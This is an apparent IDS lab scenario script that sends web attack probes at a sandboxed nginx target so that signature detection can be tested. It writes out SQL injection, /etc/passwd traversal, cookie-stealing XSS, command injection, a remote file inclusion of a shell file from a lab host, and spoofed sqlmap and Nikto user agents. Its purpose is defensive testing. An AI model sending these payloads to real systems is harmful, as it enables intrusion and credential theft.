#!/bin/sh
# Scenario 5 - web application attacks (MITRE T1190, exploit public-facing application).
#
# victim-web is a stock nginx serving a static page, so none of these requests can
# succeed: there is no database to inject into and no CGI to run. What matters is
# that the requests are on the wire in the shape a real attempt takes, which is what
# a signature IDS matches on - it inspects the request, not whether it worked.
#
#   docker run --rm --network netsentinel_lab -v "$PWD/lab/scenarios:/scenarios" \
#     curlimages/curl:8.10.1 sh /scenarios/web_attack.sh
set -eu

DIR=$(dirname "$0")
. "${DIR}/_guard.sh"

TARGET="${1:-$VICTIM_WEB}"
require_lab_target "$TARGET"

get() {
    # $1: a path already URL-encoded where the payload needs it. --path-as-is keeps
    # "../" from being collapsed before it leaves.
    curl -s -o /dev/null --path-as-is -A "${UA:-Mozilla/5.0}" "http://${TARGET}$1" || true
}

echo "[web] SQL injection, traversal, XSS and command injection against ${TARGET}"
get "/products.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--"
get "/products.php?id=1%20OR%201=1--"
get "/../../../../etc/passwd"
get "/download.php?file=../../../../etc/passwd"
get "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
get "/cgi-bin/status.cgi?cmd=;cat%20/etc/passwd"
get "/index.php?page=http://172.30.0.100/shell.txt"

echo "[web] the same probes as scanners announce themselves"
UA="sqlmap/1.8.4#stable (https://sqlmap.org)" get "/products.php?id=1%20AND%201=1"
UA="Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)" get "/admin/"

echo "[web] done"
